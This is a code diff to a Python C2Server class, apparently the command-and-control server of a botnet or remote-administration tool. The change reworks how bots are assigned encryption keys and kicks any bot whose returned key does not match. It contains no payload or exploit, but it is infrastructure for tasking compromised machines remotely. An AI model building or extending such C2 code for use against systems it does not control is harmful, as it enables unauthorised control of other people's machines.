@@ -43,12 +43,14 @@ class C2Server(QBalancedServer):
                          message.get("exit_code"))
             bot.on_task_received(event)
             self.task.emit(event)
+
         elif event_type == "module":
             event = Module(bot_id,
                            message.get("module"),
                            message.get("enabled"))
             bot.on_module_received(event)
             self.module.emit(event)
+
         elif event_type == "info":
             event = Info(bot_id,
                          message.get("info"),
@@ -56,22 +58,28 @@ class C2Server(QBalancedServer):
                          message.get("results"))
             bot.on_info_received(event)
             self.info.emit(event)
+
         elif event_type == "assign":
             key = message.get("encryption_key")
             recv_id = message.get("bot_id")
             if key and int(bot_id) == recv_id:
-                key = str(key).encode()
-                self.setCustomKeyForClient(bot_id, key)
-                bot.set_custom_key(key)
-                self.assigned.emit(bot_id, bot.ip, bot.port)
-            # TODO Kick bot if ids vary
+                if key == bot.key:
+                    key = str(key).encode()
+                    self.setCustomKeyForClient(bot_id, key)
+                    self.assigned.emit(bot_id, bot.ip, bot.port)
+                else:
+                    self.logger.warning("Assigned keys do not match! Bot {} will be kicked!".format(bot_id))
+                    self.kick(bot_id)
+
         else:
             self.logger.error("BOT-{}: Failed to find matching event type for {}".format(bot.get_id(), message))
         self.message.emit(bot_id, message)
 
     @Slot(int, str, int)
     def pre_connection(self, bot_id, ip, port):
-        self.write(bot_id, {"event_type": "assign", "bot_id": bot_id, "encryption_key": generate_key().decode()})
+        key = generate_key().decode()
+        self.getDeviceById(bot_id).set_custom_key(key)
+        self.write(bot_id, {"event_type": "assign", "bot_id": bot_id, "encryption_key": key})
 
     @Slot(int, str)
     def send_task(self, bot_id: int, task: str):
